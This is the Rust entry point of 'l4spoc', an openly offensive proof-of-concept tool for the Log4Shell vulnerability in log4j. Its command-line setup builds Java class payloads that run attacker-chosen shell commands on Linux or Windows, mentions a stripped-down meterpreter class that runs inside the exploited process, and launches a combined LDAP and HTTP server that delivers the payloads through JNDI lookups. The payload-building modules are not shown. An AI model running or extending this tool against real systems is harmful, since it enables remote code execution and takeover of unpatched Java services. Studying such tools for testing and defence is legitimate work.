#![feature(ip)]

mod web_server;
mod ldap_server;
mod build_java;
mod common;
mod multiplexed;

use common::{ServerCfg, BuildCmdCfg};
use std::fs;
use get_if_addrs::{IfAddr, get_if_addrs};
use clap::{Arg, App, ArgMatches};

#[tokio::main]
async fn main() -> () {
    let matches = App::new("l4spoc")
        .version("0.2.0")
        .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.")
        .subcommand(App::new("build")
//            .short_flag('b')
            .about("Build java class payload")
            .arg(Arg::new("class_name")
                .long("class_name")
                .short('c')
                .takes_value(true)
                .required(true)
                .help("The name of the Class to build.  It is what you would request via jndi.  for a Cmd1.class you would use Cmd1")) 
            .arg(Arg::new("linux_cmd")
                .long("linux")
                .short('l')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Linux Systems via /bin/sh -c \"the_command\"")
            ).arg(Arg::new("windows_cmd")
                .long("windows")
                .short('w')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Windows Systems via cmd -C \"the_command\"")
            ).arg(Arg::new("build_path")
                .long("build_path")
                .short('b')
                .default_value("wwwroot")
                .takes_value(true)
                .help("the dir to build the payloads.  Will create if it doesn't exist.  Shoudl use same dir as www_root in run_servers.")
            ))
        .subcommand(App::new("run")
 //           .short_flag('r')
            .about("Run the ldap and http servers")
            .arg(Arg::new("addr")
                .long("addr")
                .short('a')
                .default_value("")
                .takes_value(true)
                .help("The http address to publish")
            ).arg(Arg::new("port")
                .long("port")
                .short('p')
                .default_value("8080")
                .takes_value(true)
                .help("The port used to server the LDAP and HTTP requests from.")
            ).arg(Arg::new("wwwroot")
                .long("wwwroot")
                .default_value("wwwroot")
                .takes_value(true)
                .help("The dir to server the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir.")
            ))
        .get_matches();

    if let Some(m) = matches.subcommand_matches("build"){
        let cfg : BuildCmdCfg = convert_args_for_build_cmd(m);
        build_java::is_javac_installed();
        fs::create_dir_all(&cfg.build_path)
            .expect(&format!("Unable to create {} dir", cfg.build_path));    

        build_java::build_exec_cmd_class(cfg).expect("faild to build cmd");
    } else if let Some(m) = matches.subcommand_matches("run"){
        let cfg : ServerCfg = convert_args_for_run_servers(m);
        build_java::is_javac_installed();
        run_servers(cfg).await;
    }
}

fn get_default_ip_addr_str() -> String{
    let addrs = match get_if_addrs() {
        Ok(a) => a,
        Err(_) => return "127.0.0.1".to_string()
    };

    for a in &addrs {
//        println!("{:?}", a);
        let ip = a.ip();
        if ip.is_ipv4() &&  ip.is_global(){
            return ip.to_string() 
        }
    }
    
    for a in &addrs {
        match &a.addr {
            IfAddr::V4(av4) => {
                if av4.broadcast.is_some() {
                    return av4.ip.to_string();
                }
            },
            _ => continue,
        }
    }

    return "127.0.0.1".to_string();
}


fn convert_args_for_run_servers(m : &ArgMatches) -> ServerCfg{
    let mut addr = m.value_of_t_or_exit("addr");
    if addr == "" { addr = get_default_ip_addr_str(); }
    
    return ServerCfg{
        web_root  : m.value_of_t_or_exit("wwwroot"),
        addr,
        port : m.value_of_t_or_exit("port")
    }
}

async fn run_servers(cfg : ServerCfg) -> () {
    fs::create_dir_all(&cfg.web_root)
        .expect(&format!("Unable to create {} dir", cfg.web_root));    
    println!("We will send the JNDI requests the base address of http://{}:{}", &cfg.addr, &cfg.port);
    let msf = multiplexed::start_multiplexed_server(cfg.clone());
    tokio::join!(msf);
    tokio::signal::ctrl_c().await.unwrap();
}

fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
    return BuildCmdCfg{
        build_path : m.value_of_t_or_exit("build_path"),
        class_name : m.value_of_t_or_exit("class_name"),
        l_cmd : m.value_of_t_or_exit("linux_cmd"),
        w_cmd : m.value_of_t_or_exit("windows_cmd")
    }
}
